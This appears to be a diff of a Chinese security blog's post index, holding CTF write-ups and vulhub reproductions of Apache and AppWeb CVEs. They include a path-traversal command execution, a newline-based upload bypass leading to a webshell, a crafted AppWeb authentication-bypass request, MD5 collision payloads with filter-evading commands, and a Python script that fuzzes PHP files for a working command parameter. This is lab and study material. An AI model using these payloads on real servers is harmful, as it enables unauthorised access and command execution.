class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
-<p>最终结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
-<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
-<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
-<h1 id="总结">总结</h1>
-<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
+        <tag>Windows小知识</tag>
       </tags>
   </entry>
   <entry>
@@ -1206,6 +1041,211 @@
       </tags>
   </entry>
   <entry>
+    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
+    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
+<ul>
+<li><p>版本等于2.4.49</p></li>
+<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
+</ul>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
+<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
+<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
+<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
+</ul>
+<p>路径：</p>
+<ul>
+<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
+</ul>
+<p>运行漏洞环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>进入环境，显示如下则环境搭建成功。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
+<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
+<p>成功得到文件的内容，因此证明存在此漏洞。</p>
+<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
+<p>接下来改变请求的方式，发送如下请求：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
+<p>成功执行命令。</p>
+<h1 id="总结">总结</h1>
+<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
+<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
+<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
+<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
+<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
+<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
+<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
+<p>成功获得 webshell。</p>
+<h1 id="总结">总结</h1>
+<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
+<h1 id="资源">资源</h1>
+<ol type="1">
+<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
+    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
+<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
+<ul>
+<li>basic 传统HTTP基础认证</li>
+<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
+<li>form 表单认证</li>
+</ul>
+<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
+</ul>
+<p>路径：</p>
+<ul>
+<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
+</ul>
+<p>启动环境：</p>
+<ul>
+<li><code>sudo docker-compose up -d</code></li>
+<li>输入 <code>http://ip:8080</code> 即可访问</li>
+</ul>
+<p>前提：</p>
+<ul>
+<li>已知某个用户名为 <code>admin</code></li>
+</ul>
+<h1 id="复现">复现</h1>
+<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
+<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
+<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>（最后两个空行很重要！）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
+<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
+<ul>
+<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
+</ul>
+<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
+<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>AppWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安洵杯 2019 easy_web</title>
+    <url>/2022/04/01/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，先检查了源码，发现了返回了一张图片经过base64编码后的内容。并且有一句提示：<code>md5 is funny</code>。然后观察url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d835c69c-0e67-4191-8b98-d25591d19b6e.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure></p>
+<p>注意到两个参数<code>cmd</code>和<code>img</code>。后者的内容像是经过base64编码的，因此先进行解码。推荐网址：https://gchq.github.io/CyberChef/</p>
+<p>调用<code>magic</code>模块，发现编码规则，先经过两次base64，然后再进行16进制解码还原原来的字符串。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220118.png" /></p>
+<p>因此，这里可以传入一个文件名。虽然有可能只接受图片，但是作为尝试可以试一下<code>index.php</code>。</p>
+<h1 id="解题">解题</h1>
+<p>首先将<code>index.php</code>进行编码，然后传入img参数，cmd先保持不变。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220308.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220429.png" /></p>
+<p>将返回的内容base64解码后得到如下代码（重要部分）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">	</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;      <span class="comment">// img不能含有flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  <span class="comment">// 会将系统命令执行</span></span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>echo `$cmd`; 这句话会将 cmd 变量作为系统命令执行，像是system($cmd)</p>
+</blockquote>
+<p>这个代码可以分为两个部分，第一部分关于img参数，主要作用就是读取文件内容；第二部分就是cmd参数，主要作用就是命令执行。由于img过滤了flag，所以读取flag的内容应该通过命令执行获得。即重要的是第二部分。</p>
+<p>第二部分有一个难题，那就是如何绕过如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure></p>
+<p>如果只有后者，可以通过传入数组绕过，但是前面的却无法这样绕过。因此只能使用md5碰撞来绕过，也就是两个字符串不一样，但是它们md5值一样，从网上找到了两组： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
+<p>这里比较难以理解的是为什么反斜杠可以绕过：<code>l\s</code> 可以执行。</p>
+<blockquote>
+<p>php解释器会将<code>//</code>解释为一个反斜杠；正则解释器也是一个道理。如果要用php正则匹配一个反斜杠，需要写4个反斜杠，因为四个反斜杠经过php解释器会变成两个反斜杠，两个反斜杠经过正则解释器会变成一个反斜杠，所以能够匹配。但是反常的是有时候三个反斜杠才能正则匹配一个反斜杠（本题就是），所以本题可以使用反斜杠绕过。</p>
+</blockquote>
+<p>但是也可以用其他办法，比如<code>ls</code>用<code>dir</code>代替，<code>cat</code> 用<code>sort</code>代替。因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dir+/</span><br><span class="line">2. sort+/flag</span><br></pre></td></tr></table></figure></p>
+<p>用burp提交！+也可以用%20代替。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401223906.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题的难点主要在于MD5碰撞和最后的过滤绕过。尤其是反斜杠绕过，是在不能理解。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>php伪协议</tag>
+        <tag>命令执行</tag>
+        <tag>MD5碰撞绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯 2019 高明的黑客</title>
+    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，得到如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
+<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
+<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
+<h1 id="解题">解题</h1>
+<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
+<p>最终结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
+<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
+<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
+<h1 id="总结">总结</h1>
+<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第1周：Vulnhub Socialnetwork writeup</title>
     <url>/2022/03/27/%E7%AC%AC1%E5%91%A8%EF%BC%9AVulnhub%20Socialnetwork%20writeup/</url>
     <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第一周，该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
@@ -1389,143 +1429,6 @@
       </tags>
   </entry>
   <entry>
-    <title>第3周：Vulnhub chronos writeup</title>
-    <url>/2022/04/01/%E7%AC%AC3%E5%91%A8%EF%BC%9AVulnhub%20chronos%20writeup/</url>
-    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第3周，该靶机难度简单。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
-<p>难度：Easy</p>
-<p>虚拟机软件：Virtual Box</p>
-<p>目标：取得2个flag，获得root权限</p>
-<p>涉及的攻击方法：</p>
-<ul>
-<li>端口扫描</li>
-<li>web侦察</li>
-<li>命令注入</li>
-<li>数据编、解码</li>
-<li><strong>搜索大法</strong></li>
